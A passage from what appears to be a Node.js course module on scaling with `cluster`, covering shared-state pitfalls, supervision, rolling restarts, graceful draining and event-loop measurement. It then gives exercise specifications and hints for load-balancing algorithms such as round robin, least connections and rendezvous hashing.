each process is fully independent — which makes it a better fit for containers
than `cluster` ever was.

## Concept — the day your state breaks

Everything in this list works perfectly with one worker and breaks with two:

- **Sessions in a `Map`.** Request 1 logs in on worker A; request 2 lands on
  worker B, which has never heard of that session.
- **Rate limiting by counter.** Your "100 requests per minute" becomes
  "100 per worker per minute" — 400 with four workers.
- **In-memory caches.** Four copies, four times the memory, four cold starts,
  and no way to invalidate them all.
- **`setInterval` jobs.** The nightly report runs four times.
- **WebSocket rooms.** A message published on worker A never reaches the
  socket held by worker C.
- **Anything with `id++`.** Four sequences, all starting at 1.

The fixes are all versions of "put the state somewhere all of them can see":
Redis or Postgres for sessions and counters, a broker for pub/sub, a leader
election (or the primary itself) for scheduled jobs, and sticky routing when
you genuinely cannot move the state.

## Concept — supervision is the other half

Forking is easy; deciding what to do when a worker dies is the job.

- **Restart on exit**, but not instantly and not forever. A worker crashing on
  a poison-pill request will crash on the retry too; without backoff you get a
  fork loop that pins the CPU and floods the logs.
- **Distinguish deliberate from accidental.** A worker you asked to stop
  (`worker.disconnect()`, `SIGTERM`) must not be restarted.
- **Rolling restarts.** Fork the replacement, wait for its `listening` event,
  then `disconnect()` the old one and kill it if it has not gone in N seconds.
  Never drop below the number of healthy workers you promised.
- **Drain, do not cut.** `server.close()` stops accepting and waits for
  in-flight requests, but keep-alive sockets are idle-not-closed and will hold
  it open forever. `server.closeIdleConnections()` (Node 18.2+) is the missing
  piece.

# Reading - node/v3nc03_cluster_scaling

Clustering is two ideas welded together: a way to share a listening socket,
and a supervisor. The first is small and mostly solved. The second is where
the engineering is.

## Notes

**`cluster` is `child_process.fork` with socket sharing.** Workers are real
processes started from the same entry file with `NODE_UNIQUE_ID` set. There is
no magic beyond that — `cluster.worker.send` is the same IPC channel from the
previous sector, and everything you learned about exit codes and signals still
applies.

**Round robin is a Node-level decision, not the kernel's.** With `SCHED_RR`
the primary accepts and passes the fd, so the balancing quality is Node's
doing. That also means the primary is on the connection path: it is not doing
much work, but it exists, and a primary that blocks (running application code
it should not be running) delays every new connection in the process group.

**`SO_REUSEPORT` is the modern alternative.** `listen({ port, reusePort: true })`
lets N independent processes bind the same port, with the kernel hashing
connections across them. No primary, no fd passing, and each process can be
restarted independently — which lines up much better with how containers are
actually deployed. The cost is that you lose `cluster`'s bookkeeping and have
to supervise the processes yourself, which usually means your orchestrator
does it.

**Zero-downtime restart is a sequencing problem.** New worker up and
`listening`, then old worker `disconnect()` (stop accepting, finish in
flight), then a kill timer as the escalation. Doing it in the other order —
kill then fork — produces a window with fewer workers than you promised, which
under load is a latency spike and sometimes a queue overflow.

**Crash loops need a budget, not just a delay.** Exponential backoff slows the
loop; it does not stop it. A restart policy needs a window ("more than five
crashes in 60 seconds") after which the primary gives up and exits non-zero,
so the orchestrator above it can take over — a pod that restarts forever is
harder to notice than one that goes `CrashLoopBackOff`.

**Jitter is not decoration.** N workers that crash together (a bad deploy, a
dependency outage) will retry together, hit the recovering dependency
together, and knock it over again. Randomising each delay within a bound
spreads the thundering herd out.

**Keep-alive is why `server.close()` hangs.** `close()` stops accepting and
waits for existing connections to end. A keep-alive connection with no
in-flight request is idle, not finished, and will hold the server open until
its timeout. `closeIdleConnections()` closes exactly those; `closeAllConnections()`
closes everything, in-flight requests included, and is the last resort.

## ex1 — round robin, honestly

A cursor and a skip. The interesting property is *fairness after a change*: a
naive implementation that filters the list first and indexes into the filtered
array restarts the rotation whenever health changes, so one worker gets a burst
of traffic every time another one flaps.

## ex2 — least connections

Better than round robin whenever request cost varies, because it responds to
reality instead of assuming uniformity. It also needs a tie-break you can
defend: without one, `Math.min` returns the first index and worker 0 gets
everything at idle.

## ex3 — sticky routing without a table

Rendezvous hashing (highest random weight) gives you `hash(key + worker)` per
worker and picks the maximum. Add or remove a worker and only the keys that
scored highest on *that* worker move — about `1/n` of them — rather than the
`(n-1)/n` you get from `hash(key) % n`. That is the property the exercise
tests, and it is the same reason consistent hashing exists in cache clusters.

## ex4 — the real thing

Waiting for a `ready` message rather than for spawn is the lesson. A process
that exists is not a process that can serve: it still has to load modules,
open a database pool and bind a socket. Every rolling-restart bug in the wild
comes from treating "started" as "ready".

## ex5 — backoff arithmetic

`base * 2^attempt`, capped, plus jitter, plus a crash-loop window. Injecting
the clock and the random source is what makes it testable, and doing so is the
same discipline you will formalise in the testing sector.

## ex6 — the sequencer

The invariant is a counting argument: at no point may healthy workers drop
below `minHealthy`. Implementations that fail do so by decrementing before
incrementing — killing first because it is simpler to write.

## ex7 — the primary as the source of truth

The cheapest shared state in a cluster is the primary, because it already
talks to every worker. It is also a single point of failure and a bottleneck,
which is exactly why real systems move to Redis. Building it teaches both
halves of that trade.

## ex8 — draining

Tracking sockets by hand is what `close()` cannot do for you, and the deadline
is what turns "wait for in-flight work" into a bounded operation. Without it,
one slow request delays your deploy indefinitely.

## challenge — the controller

Supervision, backoff, rolling restart and drain in one object, with every
effect injected so it can be tested without spawning anything. If you can
write this, you can read PM2's source.

## review1 — the state you forgot

Four workers each counting to 100 is 400. Merging their reports shows the
discrepancy in numbers instead of in an incident, and the fix — one shared
store — becomes obvious rather than theoretical.

## Further reading

- [`cluster` — Node.js API docs](https://nodejs.org/api/cluster.html) — scheduling policies, worker events, `disconnect`.
- [`net.Server.listen` — Node.js API docs](https://nodejs.org/api/net.html#serverlistenoptions-callback) — `reusePort` and the options object.
- [`http.Server.closeIdleConnections`](https://nodejs.org/api/http.html#servercloseidleconnections) — the missing half of graceful shutdown.
- [`os.availableParallelism`](https://nodejs.org/api/os.html#osavailableparallelism) — the container-aware CPU count.
- [Rendezvous hashing](https://en.wikipedia.org/wiki/Rendezvous_hashing) — the sticky-routing algorithm from ex3.

# One port, many processes

## The problem the kernel solves and the one it does not

Two processes cannot `bind()` the same address and port — the second gets
`EADDRINUSE`. That restriction is the whole reason `cluster` exists, and there
are exactly two ways around it.

The first is to bind once and share the descriptor. A listening socket is a
file descriptor, and file descriptors can be sent between processes over a
Unix domain socket with `SCM_RIGHTS`. The primary binds, then passes the same
descriptor to each worker; now N processes are calling `accept()` on one
queue, and the kernel picks a winner. That is `SCHED_NONE`.

The distribution it produces is poor for a specific reason. When a connection
arrives, the kernel wakes waiters — historically all of them, the "thundering
herd" — and the one that wins the race is usually the one still hot in cache,
which is the one that just handled a connection. Linux has improved this
(`EPOLLEXCLUSIVE`, `accept` wake-one), but the bias remains: measurements on
Node clusters have shown a single worker taking 70% or more of connections
under some workloads.

So Node's default is the second way: the primary alone accepts, and hands each
*connected* socket to a worker in rotation. The handoff is the same
`SCM_RIGHTS` mechanism, one syscall pair per connection. It costs a little
latency and buys even distribution, and even distribution is what keeps p99
sane.

`SO_REUSEPORT` is the third way, added to Linux in 3.9 and exposed by Node as
`listen({ reusePort: true })`. Multiple processes each bind their own socket
to the same port, and the kernel hashes the incoming 4-tuple to choose one.
The distribution is good, there is no primary on the path, and — the part that
matters operationally — the processes are independent. You can restart one
without a supervisor that owns the socket.

## Why the primary must stay boring

In `SCHED_RR` the primary accepts every connection. It does almost nothing
with them, but "almost nothing" is not "nothing": if you put application code
in the primary branch — a metrics scrape, a config reload that reads a file
synchronously, a health endpoint — you have put work on the accept path for
the entire process group.

The rule that follows is worth stating plainly: the primary supervises and
nothing else. Metrics aggregation, scheduled jobs and admin endpoints belong
in a dedicated worker that happens to be leader, not in the process holding
the socket.

## Restarts, and the arithmetic of a deploy

A rolling restart is a sequence with an invariant. Say you run four workers
and promise at least three healthy at all times. Then each step is: fork,
await `listening`, disconnect one old worker, await its exit (or kill after
the grace period). Four times. The invariant holds because you go 4 → 5 → 4
and never 4 → 3.

The naive version goes 4 → 3 → 4, and the difference shows up under load as a
25% capacity dip repeated four times during every deploy, in a window where
clients are already retrying because some requests were interrupted. This is
the mechanism behind "our latency graph has a comb pattern at deploy time".

The grace period is the second parameter and it should match your slowest
legitimate request, not your average. A worker still streaming a 90-second
export needs 90 seconds; killing it at 10 turns a deploy into a batch of
truncated downloads. Kubernetes exposes the same knob as
`terminationGracePeriodSeconds`, and the common failure is that the pod's
grace period is shorter than the application's own drain timeout, so the
application's careful shutdown code never gets to finish.

## Keep-alive, the connection that will not end

HTTP keep-alive is why graceful shutdown is harder than it looks. `close()`
stops the listener and waits for existing connections to end — but an idle
keep-alive connection is not ending. It is waiting for another request, for up
to `server.keepAliveTimeout` (5 seconds by default in Node, often much longer
behind a load balancer that was configured for it).

Node 18.2 added `closeIdleConnections()` and `closeAllConnections()` for
exactly this. The correct drain is: stop accepting, close the idle ones, let
the busy ones finish, and force the rest at a deadline. Three lines, and the
difference between a five-second deploy and a five-minute one.

There is a subtler version behind a load balancer. If you close the listener
but the balancer has not yet noticed you are draining, it keeps sending new
connections to a socket that is gone, and clients see resets. The standard fix
is to fail the readiness check first, wait one health-check interval, and only
then start closing — the "pre-stop sleep" that looks like superstition until
you have watched the alternative.

## Measuring before you fork

The decision to cluster should follow a number, and the number is event-loop
utilisation. `perf_hooks` exposes it directly:

```ts
import { performance, monitorEventLoopDelay } from "node:perf_hooks";

const start = performance.eventLoopUtilization();
setInterval(() => {
  const { utilization } = performance.eventLoopUtilization(start);
  metrics.gauge("elu", utilization);        // 0..1
}, 5_000);
```

ELU is the fraction of wall-clock time the loop spent *doing work* rather than
waiting in `epoll`. A service at 0.15 is I/O-bound and forking four copies
will change nothing except its memory footprint; a service at 0.85 is
CPU-saturated and will get close to linear improvement from more processes,
right up until it saturates the database instead.

The companion measurement is loop delay, from `monitorEventLoopDelay()`, which
gives you a histogram with percentiles. Delay is what users feel: a p99 delay
of 200 ms means one request in a hundred waited 200 ms before your handler
even started. Clustering reduces delay by giving the queued work somewhere
else to go; it does not reduce the cost of the work itself, which is what the
worker-threads sector was for.

Two numbers, five lines of code, and they turn "we should probably cluster"
into a decision you can defend in review. The CPU-profiling sector goes deeper
into both.

## When cluster is the wrong tool

- **In a container platform.** Kubernetes, ECS and Nomad already supervise
  processes, restart them with backoff, and roll deployments. Running
  `cluster` inside a pod gives you two supervisors with different opinions, a
  process tree that hides crashes from the orchestrator (the pod stays up
  while workers die), and CPU accounting that no longer matches the pod's
  limits. One process per container, N containers, is usually right.
- **For I/O-bound work.** Four processes waiting on the same database is four
  times the memory, four times the connection pool, and the same throughput.
  Measure event-loop utilisation first: if it is 15%, more processes will not
  help.
- **When the state cannot be shared.** A service holding a large in-memory
  index that takes two minutes to build does not want four copies. Shard it or
  scale it vertically.
- **For development.** `cluster` makes stack traces, debuggers and
  `console.log` interleaving worse. Run one process locally.

The honest summary: `cluster` was designed for the era when you deployed Node
onto a machine and were responsible for using its cores. That era still exists
— a VM, a bare-metal box, a `systemd` unit — and there `cluster` is exactly
right. Inside a container, the platform has taken the job, and the best use of
this sector's knowledge is recognising which world you are in.

## Problem 1 — round robin, with health

Edit `ex1/solution.ts`. Implement:

```ts
export interface Balancer {
  next(): string | undefined;
  setHealth(id: string, healthy: boolean): void;
  healthy(): string[];
}

export function createRoundRobin(ids: readonly string[]): Balancer
```

`next()` returns the ids in order, cycling forever, skipping any worker marked
unhealthy. Marking a worker unhealthy must **not** restart the rotation: the
cursor keeps advancing from where it was. `next()` returns `undefined` when
nothing is healthy. All workers start healthy, and `setHealth` for an unknown
id is ignored.

```ts
const b = createRoundRobin(["a", "b", "c"]);
b.next();                 // "a"
b.next();                 // "b"
b.setHealth("c", false);
b.next();                 // "a"  (c skipped, rotation not reset)
b.next();                 // "b"
```

```
uv run dojo test node v3nc03_cluster_scaling ex1
```
exercises.hints:
## Hint 1

Keep the full list and a cursor over it; do not keep a filtered list. The
filtered list is the bug: rebuilding it on every health change moves every
worker's position, so one worker gets served twice in a row and another is
skipped.

## Hint 2

Advance the cursor over the whole ring, at most `ids.length` times, and take
the first healthy id you land on:

```ts
for (let tried = 0; tried < ids.length; tried++) {
  const candidate = ids[cursor];
  cursor = (cursor + 1) % ids.length;
  if (healthy.has(candidate)) return candidate;
}
return undefined;
```

The bounded loop is what stops an all-unhealthy set from spinning forever.

## Hint 3

Store health as a `Set` of healthy ids (or a `Map<string, boolean>` seeded
from the constructor). `setHealth` for an unknown id must be ignored rather
than adding it — otherwise a stale message from a worker that no longer exists
puts a phantom into your rotation.

The decision left to you: whether `healthy()` returns the ids in original
order or in rotation order. Say which, because a caller will assume one.
exercises.importantHints:
## Hint 1

Start from what round robin is actually good at and bad at. It assumes every
request costs the same. When that is true — static files, small JSON reads —
it is optimal and free. When it is not, one worker can be given a 10-second
export while the others idle, and the algorithm has no way to know.

Knowing the assumption is what tells you when to reach for ex2 instead.

## Hint 2

The health integration has a real-world subtlety worth encoding. Health flaps:
a worker fails one check, passes the next, fails again. If your balancer
reacts instantly to each flap you get traffic sloshing between workers. Real
balancers require N consecutive failures before marking a worker down and M
consecutive successes before marking it up.

This exercise does not ask for that, but the place it would go is `setHealth`,
and noticing where it goes is the point.

## Hint 3

Test the specific property that separates a correct implementation from a
lucky one: mark a worker unhealthy in the *middle* of a rotation, then healthy
again, and check the sequence. An implementation that reindexes will produce a
repeat or a skip at exactly that moment, and it is the only moment it does —
which is why it survives review and fails in production.

## Problem 2 — least connections

Edit `ex2/solution.ts`. Implement:

```ts
export interface LeastConnections {
  acquire(): string | undefined;
  release(id: string): void;
  load(): Record<string, number>;
}

export function createLeastConnections(ids: readonly string[]): LeastConnections
```

`acquire()` returns the healthy worker with the fewest in-flight requests and
increments its count. Ties are broken by **round robin among the tied
workers**, so an idle cluster does not send everything to worker 0.
`release(id)` decrements, never below zero, and ignores unknown ids.

```ts
const b = createLeastConnections(["a", "b"]);
b.acquire();        // "a"
b.acquire();        // "b"   (tie broken by rotation, not by index)
b.acquire();        // "a"
b.release("a");
b.acquire();        // "a"   (now the least loaded)
```

```
uv run dojo test node v3nc03_cluster_scaling ex2
```
exercises.hints:
## Hint 1

Two pieces of state: a count per worker, and a rotation cursor used only when
counts are equal. The second one exists because `Math.min` has no opinion
about ties and arrays have a first element.

## Hint 2

Find the minimum, then collect everyone at that minimum, then rotate among
them:

```ts
const min = Math.min(...candidates.map((id) => counts.get(id)!));
const tied = candidates.filter((id) => counts.get(id) === min);
```

Rotating within `tied` rather than within all workers is what makes the
tie-break stable as load changes: adding a busy worker does not disturb the
rotation among the idle ones.

## Hint 3

`release` must clamp at zero. A double release (a request that both errors and
completes, a retry that reuses a stale id) would otherwise drive a count
negative, and a negative count is a permanent magnet: that worker is now
always the minimum and receives everything.

The decision left to you: whether a negative release should throw instead. In
a balancer, silently clamping keeps the service up; in a test, throwing finds
the bug. Pick and comment.
exercises.importantHints:
## Hint 1

Enter from the failure that motivates least-connections at all. Round robin
sends request 5 to worker 1 regardless of the fact that worker 1 is three
seconds into a report and workers 2, 3 and 4 are idle. Least connections is
the cheapest possible feedback loop: instead of predicting cost, observe
occupancy.

That is the same idea behind every queueing system you have ever tuned.

## Hint 2

Now the failure mode of least-connections itself, because it has one. A worker
that is *broken* often finishes requests instantly — connection refused, an
immediate 500 — so its in-flight count is always zero and the balancer sends
it everything. The industry name is the "black hole" or "sinkhole" worker, and
it is why real balancers combine connection counts with health checks and
error rates.

Your `acquire` skipping unhealthy workers is the seam where that protection
lives.

## Hint 3

Think about what the counter actually counts. Requests handed out, decremented
on release — so it is only as accurate as your release discipline. Every code
path that ends a request must release: success, error, timeout, client
disconnect. A single missing release is a slow leak that ends with one worker
permanently marked as busiest and never selected again.

That is the argument for releasing in a `finally`, and for exposing `load()`
so an operator can see the drift.

exercises.hints:
## Hint 1

Compare it with `hash(key) % n` before you write anything. Change `n` from 4
to 3 and the modulus changes for roughly three quarters of all keys — every
cache entry moves, every sticky session breaks, for one worker leaving.

Rendezvous hashing asks a different question: not "which slot", but "which
worker scores highest for this key".

## Hint 2

FNV-1a in 32 bits, which stays exact in a double:

```ts
let h = 0x811c9dc5;
for (let i = 0; i < input.length; i++) {
  h ^= input.charCodeAt(i);
  h = Math.imul(h, 0x01000193);
}
return h >>> 0;
```

`Math.imul` is the 32-bit multiply — plain `*` overflows into floating point
and destroys the low bits you depend on.

## Hint 3

`route` is a scan: compute the weight for each worker, keep the maximum. It is
O(n) per key, which is fine for tens of workers and is the honest cost of the
algorithm — consistent hashing with a ring trades that for O(log n) and a lot
more code.

The decision left to you: whether to cache the per-worker hashes. The key
changes every call, so most of the work cannot be cached — notice which part
can.
exercises.importantHints:
## Hint 1

Enter from why anyone wants stickiness at all. It is a workaround: the state
should be shared, and it is not, so you route the same key to the same process
to keep the state reachable. WebSocket connections, in-memory upload sessions
and per-user caches are the usual reasons.

That framing matters because stickiness has a cost — uneven load, a lost
session when a worker dies — and a design that could share the state instead
usually should.

## Hint 2

Now the property that makes rendezvous hashing the right *kind* of stickiness.
The alternative, "assign on first sight and remember in a table", works
perfectly until the table is per-worker (now every worker needs it), or the
worker holding a key dies (now the table is wrong), or two balancers disagree.
Rendezvous hashing is a pure function: no table, and every process computes
the same answer.

## Hint 3

Test the invariant rather than the output. Generate a few thousand keys, route
them all, remove a worker, route them all again, and count how many changed.
The number should be close to the share that pointed at the removed worker —
about a quarter for four workers — and *exactly* zero of the unaffected keys
should move.

With `% n`, the same experiment moves about 75% of the keys, which is the most
convincing possible argument for the algorithm.

## Problem 4 — forking workers for real

Edit `ex4/solution.ts`. Implement:

```ts
export interface WorkerHandle { id: number; pid: number; send(value: unknown): void; }

export interface Fleet {
  workers(): WorkerHandle[];
  shutdown(): Promise<number[]>;   // resolves with the exit codes, in id order
}

export function startWorkers(count: number, source: string): Promise<Fleet>
```

Spawn `count` Node children with `["-e", source]` and
`stdio: ["ignore", "ignore", "ignore", "ipc"]`. Each child sends
`{ type: "ready" }` when it is prepared to serve. `startWorkers` resolves only
once **every** worker has reported ready — a process that exists is not a
process that can serve.

`shutdown()` disconnects each child, waits for it to exit, and resolves with
the exit codes in id order. A child that fails to start rejects the whole
`startWorkers` call, and any children already started are cleaned up.

